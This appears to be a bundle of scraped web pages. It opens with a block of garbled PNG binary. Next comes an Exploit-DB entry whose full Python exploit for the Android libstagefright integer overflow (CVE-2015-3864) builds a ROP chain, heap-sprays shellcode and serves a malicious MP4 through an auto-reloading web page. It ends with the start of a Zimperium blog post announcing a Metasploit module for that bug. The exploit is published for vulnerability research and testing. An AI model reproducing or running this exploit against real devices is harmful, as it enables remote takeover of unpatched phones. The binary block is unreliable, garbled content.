=== Content from www.zimperium.com_6b6f61f3_20250126_041221.html ===
�PNG

   
IHDR  ,   .   ��$�  
�IDATx���p�hq�a(S�23\_i�̐.3S��TZ\*y�
�e���+33��BЖ�g�|3�މ]I��{�3�à�>�\*��85����"�(��&�" 񈆪����ٹ@`R�1��mx�,��ۑnb+���`&���Ï������ɕ�(�/b:������(�n3?
��؎�����@>#���3�JE�����w�\*rrrr�b��@w>A�"'''8o�k���P��G~����y��Q�Ŏ��R��뺊X�a~�Q����������F���\_�s�]N�\_Q�Lqx����}&�Y�(���������Y/��������#Df!��ޘ�C&�B�/�;�4|L��36�#Z��dL�a�1�M1�}�������h8�٬G���a��h��ch�x�A|N�5��rA<�3�4įe��3�/W��{��!V��[P��X�a��G�,<O����Ċ01��s0�k��@�F4��`��G.Ι�7�q���}���,��
�7���H�&�\_���#!�����!5��9�C�z>l�v
�f�s�9-ޮ������v�\*�#z:�P]�
şr�,�4�DWxl>�R�r�� �`N�9�EZ�����Ԉc>� ����F�
�B��.A���X#
��g� .�Yt�j%X�v ����������`�x��c~��#6X����l<ƪ`140{�U�B8gt�p{�w,�/�1�`,Qz���z�����om�P������W[?տ�~v@]�⠺������i���
��5��i�>�H��7r%l�0��1X��(��,
�����,>D.�s�����b� 3Q&�e��bԄj�Uu�
E`6K�7f�[���s؉����:�j�[��?��z� ���\_��-U�ڭ���G
}gϚ��޵����u��D-���!h�gx��F0'E�\_�8D�!
�"�S��` ���{<���+�P���p�6c2 �n�2XG�ɂ A+[�I`N� f��P#7X֣8ƚc
|`�%��`�N�� ��Q�� ��1X�p�]G� ��<�C��gX��l�"�v]Q���c!>�9��Q㎠z�5����E�C�� x����Z������U�6�-����h�a
�>G�/�
�0���1�
�Q�� )��,�� V�����ia�.aS���W�9r�h @|�0���Σq��H���Ґ���G�! �uU���#��gT[�DXB%�V���<�SX���XC�]>�(�b���"RE�O ]p`��q�. �4@�@m�^�>Ɵ#�+��s�� b�(W+��8�P�v�p�J�P���6#j�����U�OPV �R���c�q �0�+PQa. V.N���)dA�َ��
+
�\*v���CI��8�+̍�j��U�G���sop�(�q7�C+�U,Z�p��kTP�����-h�E�����Oi
V������v/�X1�����+�O���R����(n�0N�<�)�~�p�з��
1U�`�D�!ܭ��X���`ec�Vڂx�J�3|0��#Fa�1Q��l�6(�?1堺����f;��
sC����8C�
�\*(����:�����s�
Q4T�U�=x���,��
��X��D��5Xu��
�c\*�� T���ȇqYx�+�%�� Vvˇ���)�i�$z�\pᨆ"�`���
��w����� XCB
���D^�#ob�`�2�~�U�
���V�#��q���8��!X�h��lA��
���&�A�:���M�ځG�f0��v�jS��"�����)&��C�Ѓ%��4<�x��2X�E��-�)�U�k1V��U��x�h$��P�ja+̶�WK�k�b���uX���c ��������
���L�B���9�㢃M�J�Aw?♜����R�K�Ѓ%�C��x0 Iv��� Vr�O���|��}1w��s�i�-� �5��~}H}��"��P�[�"n'A�����0�)��y�=Vc�2�
�D��\*� ��8?>FYć(ږ`�`=�(<����0�/oC��1fۇ���p@�1"ƍ��?�h���G�0��D$��T�
���`?�"֡�
��0��X{��`Yc[�[^�,��#�&���`�ce�l�0�Q��c
��l9�0�+0 �`&a<�Aw�~%X|�����h��D�C��8,�\�k��?˚Mp�)Ά`��+�a6?n�(v����l��.VM,B5|���-F�F��KWc1��j;�:+�qL8,,m��%�����7�����4�EU��8X���0�c)����` ~S�K�
�&X��p�|���d�d���1�/��\��,-��³~6�T�+ �DoLGsLE?LFo���h�qh�-���P��X��K�a����c����3Y�5�` y�T��?�P��G��w�I��#P��>�"YaND˃6X?�{��1H�E�)���0���;�49��,��k���^�wL~H�)f�[�l�r�律g��f�˅��9Dy?�W�51�$X�5��rA��h4�,�1d�.rq7p+0
�ۮ(8��ǆ��O�k0
&���x3���1�5Z\*j�����x������t<j�:�+:�
j"j)�<cD?�d�ja1|ЃpC�0999�pKE
f"����� �"'''w����A�cZ@U\0999�h�)�w�)j�-Vrrr2Zt�a�a:�NNNNF+
��\*�\*�����<%������?�Ncԝ��    IEND�B`�

=== Content from www.exploit-db.com_7dc5dfe5_20250124_224808.html ===

[![Exploit Database](/images/spider-white.png)](/)
[Exploit Database](/)

* [Exploits](/)
* [GHDB](/google-hacking-database)
* [Papers](/papers)
* [Shellcodes](/shellcodes)

---

* [Search EDB](/search)
* [SearchSploit Manual](/searchsploit)
* [Submissions](/submit)

---

* [Online Training](https://www.offsec.com/)

[![Exploit Database](/images/edb-logo.png)](/)

* [Stats](/exploit-database-statistics)
* [About Us](/)

  [About Exploit-DB](/about-exploit-db)
  [Exploit-DB History](/history)
  [FAQ](/faq)
* Search

# Google Android - libstagefright Integer Overflow Remote Code Execution

#### EDB-ID:

###### 38226

#### CVE:

###### [2015-3864](https://nvd.nist.gov/vuln/detail/CVE-2015-3864)

---

**EDB Verified:**

#### Author:

###### [Google Security Research](/?author=7725)

#### Type:

###### [remote](/?type=remote)

---

#### Platform:

###### [Android](/?platform=android)

#### Date:

###### 2015-09-17

---

**Vulnerable App:**

```
#!/usr/bin/python2

import cherrypy
import os
import pwnlib.asm as asm
import pwnlib.elf as elf
import sys
import struct

with open('shellcode.bin', 'rb') as tmp:
  shellcode = tmp.read()

while len(shellcode) % 4 != 0:
  shellcode += '\x00'

# heap grooming configuration
alloc_size = 0x20
groom_count = 0x4
spray_size = 0x100000
spray_count = 0x10

# address of the buffer we allocate for our shellcode
mmap_address = 0x90000000

# addresses that we need to predict
libc_base = 0xb6ebd000
spray_address = 0xb3000000

# ROP gadget addresses
stack_pivot = None
pop_pc = None
pop_r0_r1_r2_r3_pc = None
pop_r4_r5_r6_r7_pc = None
ldr_lr_bx_lr = None
ldr_lr_bx_lr_stack_pad = 0
mmap64 = None
memcpy = None

def find_arm_gadget(e, gadget):
  gadget_bytes = asm.asm(gadget, arch='arm')
  gadget_address = None
  for address in e.search(gadget_bytes):
    if address % 4 == 0:
      gadget_address = address
      if gadget_bytes == e.read(gadget_address, len(gadget_bytes)):
        print asm.disasm(gadget_bytes, vma=gadget_address, arch='arm')
        break
  return gadget_address

def find_thumb_gadget(e, gadget):
  gadget_bytes = asm.asm(gadget, arch='thumb')
  gadget_address = None
  for address in e.search(gadget_bytes):
    if address % 2 == 0:
      gadget_address = address + 1
      if gadget_bytes == e.read(gadget_address - 1, len(gadget_bytes)):
        print asm.disasm(gadget_bytes, vma=gadget_address-1, arch='thumb')
        break
  return gadget_address

def find_gadget(e, gadget):
  gadget_address = find_thumb_gadget(e, gadget)
  if gadget_address is not None:
    return gadget_address
  return find_arm_gadget(e, gadget)

def find_rop_gadgets(path):
  global memcpy
  global mmap64
  global stack_pivot
  global pop_pc
  global pop_r0_r1_r2_r3_pc
  global pop_r4_r5_r6_r7_pc
  global ldr_lr_bx_lr
  global ldr_lr_bx_lr_stack_pad

  e = elf.ELF(path)
  e.address = libc_base

  memcpy = e.symbols['memcpy']
  print '[*] memcpy : 0x{:08x}'.format(memcpy)
  mmap64 = e.symbols['mmap64']
  print '[*] mmap64 : 0x{:08x}'.format(mmap64)

  # .text:00013344    ADD             R2, R0, #0x4C
  # .text:00013348    LDMIA           R2, {R4-LR}
  # .text:0001334C    TEQ             SP, #0
  # .text:00013350    TEQNE           LR, #0
  # .text:00013354    BEQ             botch_0
  # .text:00013358    MOV             R0, R1
  # .text:0001335C    TEQ             R0, #0
  # .text:00013360    MOVEQ           R0, #1
  # .text:00013364    BX              LR

  pivot_asm = ''
  pivot_asm += 'add   r2, r0, #0x4c\n'
  pivot_asm += 'ldmia r2, {r4 - lr}\n'
  pivot_asm += 'teq   sp, #0\n'
  pivot_asm += 'teqne lr, #0'
  stack_pivot = find_arm_gadget(e, pivot_asm)
  print '[*] stack_pivot : 0x{:08x}'.format(stack_pivot)

  pop_pc_asm = 'pop {pc}'
  pop_pc = find_gadget(e, pop_pc_asm)
  print '[*] pop_pc : 0x{:08x}'.format(pop_pc)

  pop_r0_r1_r2_r3_pc = find_gadget(e, 'pop {r0, r1, r2, r3, pc}')
  print '[*] pop_r0_r1_r2_r3_pc : 0x{:08x}'.format(pop_r0_r1_r2_r3_pc)

  pop_r4_r5_r6_r7_pc = find_gadget(e, 'pop {r4, r5, r6, r7, pc}')
  print '[*] pop_r4_r5_r6_r7_pc : 0x{:08x}'.format(pop_r4_r5_r6_r7_pc)

  ldr_lr_bx_lr_stack_pad = 0
  for i in range(0, 0x100, 4):
    ldr_lr_bx_lr_asm =  'ldr lr, [sp, #0x{:08x}]\n'.format(i)
    ldr_lr_bx_lr_asm += 'add sp, sp, #0x{:08x}\n'.format(i + 8)
    ldr_lr_bx_lr_asm += 'bx  lr'
    ldr_lr_bx_lr = find_gadget(e, ldr_lr_bx_lr_asm)
    if ldr_lr_bx_lr is not None:
      ldr_lr_bx_lr_stack_pad = i
      break

def pad(size):
  return '#' * size

def pb32(val):
  return struct.pack(">I", val)

def pb64(val):
  return struct.pack(">Q", val)

def p32(val):
  return struct.pack("<I", val)

def p64(val):
  return struct.pack("<Q", val)

def chunk(tag, data, length=0):
  if length == 0:
    length = len(data) + 8
  if length > 0xffffffff:
    return pb32(1) + tag + pb64(length)+ data
  return pb32(length) + tag + data

def alloc_avcc(size):
  avcc = 'A' * size
  return chunk('avcC', avcc)

def alloc_hvcc(size):
  hvcc = 'H' * size
  return chunk('hvcC', hvcc)

def sample_table(data):
  stbl = ''
  stbl += chunk('stco', '\x00' * 8)
  stbl += chunk('stsc', '\x00' * 8)
  stbl += chunk('stsz', '\x00' * 12)
  stbl += chunk('stts', '\x00' * 8)
  stbl += data
  return chunk('stbl', stbl)

def memory_leak(size):
  pssh = 'leak'
  pssh += 'L' * 16
  pssh += pb32(size)
  pssh += 'L' * size
  return chunk('pssh', pssh)

def heap_spray(size):
  pssh = 'spry'
  pssh += 'S' * 16
  pssh += pb32(size)

  page = ''

  nop = asm.asm('nop', arch='thumb')
  while len(page) < 0x100:
    page += nop
  page += shellcode
  while len(page) < 0xed0:
    page += '\xcc'

  # MPEG4DataSource fake vtable
  page += p32(stack_pivot)

  # pivot swaps stack then returns to pop {pc}
  page += p32(pop_r0_r1_r2_r3_pc)

  # mmap64(mmap_address,
  #        0x1000,
  #        PROT_READ | PROT_WRITE | PROT_EXECUTE,
  #        MAP_PRIVATE | MAP_FIXED | MAP_ANONYMOUS,
  #        -1,
  #        0);

  page += p32(mmap_address)             # r0 = address
  page += p32(0x1000)                   # r1 = size
  page += p32(7)                        # r2 = protection
  page += p32(0x32)                     # r3 = flags
  page += p32(ldr_lr_bx_lr)             # pc

  page += pad(ldr_lr_bx_lr_stack_pad)
  page += p32(pop_r4_r5_r6_r7_pc)       # lr
  page += pad(4)

  page += p32(0x44444444)               # r4
  page += p32(0x55555555)               # r5
  page += p32(0x66666666)               # r6
  page += p32(0x77777777)               # r7
  page += p32(mmap64)                   # pc

  page += p32(0xffffffff)               # fd      (and then r4)
  page += pad(4)                        # padding (and then r5)
  page += p64(0)                        # offset  (and then r6, r7)
  page += p32(pop_r0_r1_r2_r3_pc)       # pc

  # memcpy(shellcode_address,
  #        spray_address + len(rop_stack),
  #        len(shellcode));

  page += p32(mmap_address)             # r0 = dst
  page += p32(spray_address - 0xed0)    # r1 = src
  page += p32(0xed0)                    # r2 = size
  page += p32(0x33333333)               # r3
  page += p32(ldr_lr_bx_lr)             # pc

  page += pad(ldr_lr_bx_lr_stack_pad)
  page += p32(pop_r4_r5_r6_r7_pc)       # lr
  page += pad(4)

  page += p32(0x44444444)               # r4
  page += p32(0x55555555)               # r5
  page += p32(0x66666666)               # r6
  page += p32(0x77777777)               # r7
  page += p32(memcpy)                   # pc

  page += p32(0x44444444)               # r4
  page += p32(0x55555555)               # r5
  page += p32(0x66666666)               # r6
  page += p32(0x77777777)               # r7
  page += p32(mmap_address + 1)         # pc

  while len(page) < 0x1000:
    page += '#'

  pssh += page * (size // 0x1000)

  return chunk('pssh', pssh)

def exploit_mp4():
  ftyp = chunk("ftyp","69736f6d0000000169736f6d".decode("hex"))

  trak = ''

  # heap spray so we have somewhere to land our corrupted vtable
  # pointer

  # yes, we wrap this in a sample_table for a reason; the
  # NuCachedSource we will be using otherwise triggers calls to mmap,
  # leaving our large allocations non-contiguous and making our chance
  # of failure pretty high. wrapping in a sample_table means that we
  # wrap the NuCachedSource with an MPEG4Source, making a single
  # allocation that caches all the data, doubling our heap spray
  # effectiveness :-)
  trak += sample_table(heap_spray(spray_size) * spray_count)

  # heap groom for our MPEG4DataSource corruption

  # get the default size allocations for our MetaData::typed_data
  # groom allocations out of the way first, by allocating small blocks
  # instead.
  trak += alloc_avcc(8)
  trak += alloc_hvcc(8)

  # we allocate the initial tx3g chunk here; we'll use the integer
  # overflow so that the allocated buffer later is smaller than the
  # original size of this chunk, then overflow all of the following
  # MPEG4DataSource object and the following pssh allocation; hence why
  # we will need the extra groom allocation (so we don't overwrite
  # anything sensitive...)

  # | tx3g | MPEG4DataSource | pssh |
  overflow = 'A' * 24

  # | tx3g ----------------> | pssh |
  overflow += p32(spray_address)         # MPEG4DataSource vtable ptr
  overflow += '0' * 0x48
  overflow += '0000'                    # r4
  overflow += '0000'                    # r5
  overflow += '0000'                    # r6
  overflow += '0000'                    # r7
  overflow += '0000'                    # r8
  overflow += '0000'                    # r9
  overflow += '0000'                    # r10
  overflow += '0000'                    # r11
  overflow += '0000'                    # r12
  overflow += p32(spray_address + 0x20) # sp
  overflow += p32(pop_pc)               # lr

  trak += chunk("tx3g", overflow)

  # defragment the for alloc_size blocks, then make our two
  # allocations. we end up with a spurious block in the middle, from
  # the temporary ABuffer deallocation.

  # | pssh | - | pssh |
  trak += memory_leak(alloc_size) * groom_count

  # | pssh | - | pssh | .... | avcC |
  trak += alloc_avcc(alloc_size)

  # | pssh | - | pssh | .... | avcC | hvcC |
  trak += alloc_hvcc(alloc_size)

  # | pssh | - | pssh | pssh | avcC | hvcC | pssh |
  trak += memory_leak(alloc_size) * 8

  # | pssh | - | pssh | pssh | avcC | .... |
  trak += alloc_hvcc(alloc_size * 2)

  # entering the stbl chunk triggers allocation of an MPEG4DataSource
  # object

  # | pssh | - | pssh | pssh | avcC | MPEG4DataSource | pssh |
  stbl = ''

  # | pssh | - | pssh | pssh | .... | MPEG4DataSource | pssh |
  stbl += alloc_avcc(alloc_size * 2)

  # | pssh | - | pssh | pssh | tx3g | MPEG4DataSource | pssh |
  # | pssh | - | pssh | pssh | tx3g ----------------> |
  overflow_length = (-(len(overflow) - 24) & 0xffffffffffffffff)
  stbl += chunk("tx3g", '', length = overflow_length)

  trak += chunk('stbl', stbl)

  return ftyp + chunk('trak', trak)

index_page = '''
<!DOCTYPE html>
<html>
  <head>
    <title>Stagefrightened!</title>
  </head>
  <body>
    <script>
    window.setTimeout('location.reload(true);', 4000);
    </script>
    <iframe src='/exploit.mp4'></iframe>
  </body>
</html>
'''

class ExploitServer(object):

  exploit_file = None
  exploit_count = 0

  @cherrypy.expose
  def index(self):
    self.exploit_count += 1
    print '*' * 80
    print 'exploit attempt: ' + str(self.exploit_count)
    print '*' * 80
    return index_page

  @cherrypy.expose(["exploit.mp4"])
  def exploit(self):
    cherrypy.response.headers['Content-Type'] = 'video/mp4'
    cherrypy.response.headers['Content-Encoding'] = 'gzip'

    if self.exploit_file is None:
      exploit_uncompressed = exploit_mp4()
      with open('exploit_uncompressed.mp4', 'wb') as tmp:
        tmp.write(exploit_uncompressed)
      os.system('gzip exploit_uncompressed.mp4')
      with open('exploit_uncompressed.mp4.gz', 'rb') as tmp:
        self.exploit_file = tmp.read()
      os.system('rm exploit_uncompressed.mp4.gz')

    return self.exploit_file

def main():
  find_rop_gadgets('libc.so')
  with open('exploit.mp4', 'wb') as tmp:
    tmp.write(exploit_mp4())
  cherrypy.quickstart(ExploitServer())

if __name__ == '__main__':
  main()

```

**Tags:**

**Advisory/Source:**
Link

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/statistics) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Databases
[Exploits](/)
[Google Hacking](/google-hacking-database)
[Papers](/papers)
[Shellcodes](/shellcodes)

Links
[Search Exploit-DB](/search)
[Submit Entry](/submit)
[SearchSploit Manual](/searchsploit)
[Exploit Statistics](/statistics)

Sites
[OffSec](https://www.offsec.com)
[Kali Linux](https://www.kali.org/)
[VulnHub](https://www.vulnhub.com)

Solutions
[Courses and Certifications](https://www.offsec.com/courses-and-certifications/)
[Learn Subscriptions](https://www.offsec.com/learn/)
[OffSec Cyber Range](https://www.offsec.com/cyber-range/)
[Proving Grounds](https://www.offsec.com/labs/)
[Penetration Testing Services](https://www.offsec.com/penetration-testing/)

* [Exploit Database by OffSec](/)
* [Terms](/terms)
* [Privacy](/privacy)
* [About Us](/about-exploit-db)
* [FAQ](/faq)
* [Cookies](/cookies)

©
[OffSec Services Limited](https://www.offsec.com/) 2025. All rights reserved.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

Close

##### OffSec Resources

×

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
|  | [Proving Grounds](https://www.offsec.com/labs/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/serchsploit) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Close

##### Search The Exploit Database

×

Title

CVE

Type

dos

local

remote

shellcode

papers

webapps

Platform

AIX

ASP

BSD

BSD\_PPC

BSD\_x86

BSDi\_x86

CGI

FreeBSD

FreeBSD\_x86

FreeBSD\_x86-64

Generator

Hardware

HP-UX

IRIX

JSP

Linux

Linux\_MIPS

Linux\_PPC

Linux\_SPARC

Linux\_x86

Linux\_x86-64

MINIX

Multiple

NetBSD\_x86

Novell

OpenBSD

OpenBSD\_x86

OSX\_PPC

OSX

PHP

Plan9

QNX

SCO

SCO\_x86

Solaris

Solaris\_SPARC

Solaris\_x86

Tru64

ULTRIX

Unix

UnixWare

Windows\_x86

Windows\_x86-64

Windows

ARM

CFM

Netware

SuperH\_SH4

Java

BeOS

Immunix

Palm\_OS

AtheOS

iOS

Android

XML

Perl

Python

System\_z

JSON

ASHX

Ruby

ASPX

macOS

Linux\_CRISv32

eZine

Magazine

NodeJS

Alpha

Solaris\_MIPS

Lua

watchOS

VxWorks

Python2

Python3

TypeScript

Go

Author

Content

Port

14

21

22

23

25

42

49

53

66

69

70

79

80

81

102

105

110

111

113

119

123

135

139

143

161

162

164

383

389

402

406

411

443

444

445

446

502

504

513

514

515

532

548

554

555

617

623

631

655

689

783

787

808

873

888

901

998

1000

1040

1089

1099

1100

1114

1120

1194

1235

1471

1521

1533

1581

1589

1604

1617

1723

1743

1761

1812

1858

1861

1900

1947

2000

2022

2049

2100

2103

2121

2125

2181

2242

2315

2375

2380

2381

2401

2480

2525

2640

2810

2812

2947

2954

2990

3000

3030

3050

3052

3128

3129

3181

3200

3217

3306

3333

3378

3389

3460

3465

3500

3535

3632

3690

3790

3814

3817

4000

4002

4070

4081

4105

4111

4322

4343

4434

4444

4501

4555

4592

4661

4750

4848

5000

5060

5061

5080

5081

5093

5151

5180

5247

5250

5272

5308

5432

5466

5554

5555

5600

5655

5666

5800

5803

5814

5858

5900

5984

6066

6070

6080

6082

6101

6112

6129

6379

6502

6503

6660

6667

7001

7002

7070

7071

7080

7100

7144

7210

7272

7290

7426

7443

7510

7547

7649

7770

7777

7778

7787

7879

7902

8000

8001

8002

8004

8008

8020

8022

8023

8028

8030

8080

8081

8082

8088

8090

8181

8300

8400

8443

8445

8473

8500

8585

8619

8800

8812

8839

8880

8888

9000

9001

9002

9080

9090

9091

9100

9124

9200

9251

9256

9443

9447

9784

9788

9855

9876

9900

9987

9993

9999

10000

10001

10080

10202

10203

10443

10616

11000

11211

11460

12203

12221

12345

12397

12401

13327

13701

13722

13838

16992

18821

18881

19000

19810

19813

20000

20002

20010

20031

20111

20171

22003

23423

25672

26000

27015

27700

28015

30000

30303

31337

32400

32674

32764

34205

37215

37777

37848

38292

40007

41523

44334

46824

48080

49152

50000

50496

52311

52789

52869

52986

53413

54345

54890

55554

55555

56380

57772

58080

62514

Tag

WordPress Core

Metasploit Framework (MSF)

WordPress Plugin

SQL Injection (SQLi)

Cross-Site Scripting (XSS)

File Inclusion (LFI/RFI)

Cross-Site Request Forgery (CSRF)

Denial of Service (DoS)

Code Injection

Command Injection

Authentication Bypass / Credentials Bypass (AB/CB)

Client Side

Use After Free (UAF)

Out Of Bounds

Remote

Local

XML External Entity (XXE)

Integer Overflow

Server-Side Request Forgery (SSRF)

Race Condition

NULL Pointer Dereference

Malware

Buffer Overflow

Heap Overflow

Type Confusion

Object Injection

Bug Report

Console

Pwn2Own

Traversal

Deserialization

Verified

Has App

No Metasploit

Search



=== Content from blog.zimperium.com_33674bd7_20250124_224805.html ===


[![Zimperium](data:image/svg+xml...)![Zimperium](https://www.zimperium.com/wp-content/uploads/2024/08/ZIMPERIUM-logo_orangeZ_white.png)
![Zimperium](data:image/svg+xml...)![Zimperium](https://www.zimperium.com/wp-content/uploads/2024/08/ZIMPERIUM-logo_orangeZ_white.png)](https://www.zimperium.com)

Search for:

* [Platform](https://www.zimperium.com/platform/)
* Products
  + MOBILE ENDPOINT SECURITY
    - [Zimperium MTD](https://www.zimperium.com/mtd/)
    - [Zimperium MTD for Chromebooks](https://www.zimperium.com/chromebooks/)
    - [z3A Application Vetting](https://www.zimperium.com/z3a-advanced-app-analysis/)
    - [zSecure Resident Safety](https://www.zimperium.com/zsecure/)
  + MOBILE APPLICATION SECURITY
    - [MAPS Mobile Application Protection Suite](https://www.zimperium.com/mobile-app-protection/)
    - [zScan Application Security Testing](https://www.zimperium.com/zscan/)
    - [zKeyBox Cryptographic Key Protection](https://www.zimperium.com/zkeybox/)
    - [zShield Application Shielding](https://www.zimperium.com/zshield/)
    - [zDefend Runtime Application Self-Protection](https://www.zimperium.com/zdefend/)
  + THREAT INTELLIGENCE
    - [Advanced Mobile Threat Insights](https://www.zimperium.com/support-advancedthreatinsights/)
    - [Mobile Threat Defense Maturity](https://www.zimperium.com/mtd-maturity-model/)
* Use Cases
  + [Combatting Mobile Banking Malware](https://www.zimperium.com/mobile-banking-malware/)
  + [Implementing Mobile Zero Trust](https://www.zimperium.com/zerotrust/)
  + [Securing Mobile O365](https://www.zimperium.com/secureoffice365/)
  + [Phishing Protection](https://www.zimperium.com/mobile-phishing-protection/)
  + [Ensuring Security Compliance](https://www.zimperium.com/industry/compliance/)
    - [MAS Regulations](/industry/compliance/regulations-mas/)
    - [PSD2 Regulation](https://www.zimperium.com/industry/compliance/psd2-regulation/)
    - [RMiT Regulation](https://www.zimperium.com/industry/compliance/rmit-regulation/)
  + [Neobank Security](https://www.zimperium.com/neobanks/)
  + [Protecting Mobile Payments](https://www.zimperium.com/mobile-payments/)
  + [SoftPOS Certification](https://www.zimperium.com/softpos-providers-secure-with-zimperium/)
  + [Mobile Threat Defense](https://www.zimperium.com/mobile-threat-defense/)
  + [Connected Medical Devices and Apps](https://www.zimperium.com/industry/healthcare/connected-medical-devices-and-apps/)
* [Industries](https://www.zimperium.com/industry/)
  + [Automotive](https://www.zimperium.com/industry/automotive/)
  + [Banking](/industry/banking/)
  + [Education](https://www.zimperium.com/industry/education/)
  + [Government](https://www.zimperium.com/industry/government/)
  + [State & Local Government](https://www.zimperium.com/state-local-government/)
  + [Healthcare](https://www.zimperium.com/industry/healthcare/)
  + [Insurance](https://www.zimperium.com/industry/insurance/)
  + [Legal](https://www.zimperium.com/?page_id=1284)
  + [Pharmaceutical](https://www.zimperium.com/industry/pharmaceutical/)
  + [Retail & Mobile E-Commerce](https://www.zimperium.com/industry/retail/)
  + [Media and Entertainment](https://www.zimperium.com/ott-app-security-for-media-and-entertainment/)
* Partners
  + [zPartners](https://www.zimperium.com/partners/)
  + [Become a Partner](https://www.zimperium.com/partner-contact/)
* [Company](https://www.zimperium.com/company/)
  + [About Zimperium](https://www.zimperium.com/company/)
  + [News](https://www.zimperium.com/resources/press-releases/)
  + [Careers](https://www.zimperium.com/careers/)
  + [Awards](https://www.zimperium.com/company/awards/)
  + [Contact Zimperium](https://www.zimperium.com/contact-us/)
* [Resources](https://www.zimperium.com/resources/)
  + [Resources](https://www.zimperium.com/resources/)
  + [Events](https://www.zimperium.com/events/)
  + [FAQs](https://www.zimperium.com/faq/)
  + [Glossary](https://www.zimperium.com/glossary/)
  + [Threat Research](https://www.zimperium.com/zlabs/)
* [Blog](/blog/)

Search for:

[Zimperium](https://www.zimperium.com "Go to Zimperium.") > [Blogs](https://www.zimperium.com/blog/ "Go to Blogs.") > [Mobile Security](https://www.zimperium.com/blog-category/mobile-security/ "Go to the Mobile Security Format archives."), [Partners](https://www.zimperium.com/blog-category/partners/ "Go to the Partners Format archives."), [Threat Research](https://www.zimperium.com/blog-category/threat-research/ "Go to the Threat Research Format archives.") > Browser-based CVE-2015-3864 Metasploit Module Now Available for Testing

# Browser-based CVE-2015-3864 Metasploit Module Now Available for Testing

   September 23, 2016
[zLabs](https://www.zimperium.com/author/zlabs/ "Posts by zLabs")

Share this blog

By:**Zuk Avraham**

[Follow Zuk Avraham (@ihackbanme)](https://twitter.com/ihackbanme)**Joshua Drake**

[Follow Joshua Drake (@jduck)](https://twitter.com/jduck)

Last year, we disclosed a series of critical vulnerabilities within Android’s multimedia processing code — libstagefright. We promised to release the exploit for testing purposes and quickly published our [exploit for CVE-2015-1538](/the-latest-on-stagefright-cve-2015-1538-exploit-is-now-available-for-testing-purposes/) targeting the Galaxy Nexus running Android 4.0.4. We delivered this exploit via MMS to help carriers simulate and block a potential MMS-based worm scenario. We are now ready to release our browser-based CVE-2015-3864 exploit for testing, but first let’s look at what prompted this decision.

### The Impact on Android

Google responded quickly when we first notified them of the vulnerabilities we discovered. They:

1. quickly accepted patches provided to AOSP
2. updated the Hangouts and Messenger apps to remove automatic media processing
3. started releasing monthly Nexus updates and bulletins and
4. pushed OEMs and carriers to improve the way they handle and remediate vulnerabilities

Despite improvements in the ecosystem (kudos where deserved), updating Android devices remains a challenge and leaves many end users’ handsets exposed to serious vulnerabilities. Multimedia-related vulnerabilities have made an appearance in every Nexus/Android Security Bulletin to date. The most recent Android Security Bulletin in September included 11 vulnerabilities that affected Mediaserver amongst the 55 CVEs referenced. Prior to that, 460 CVEs affecting the Android platform (159 critical, 191 high, 68 moderate, and 5 with low severity) had been disclosed. Usually, an attacker needs between one and five vulnerabilities to take full control over a device. Keeping devices updated has never been more important.

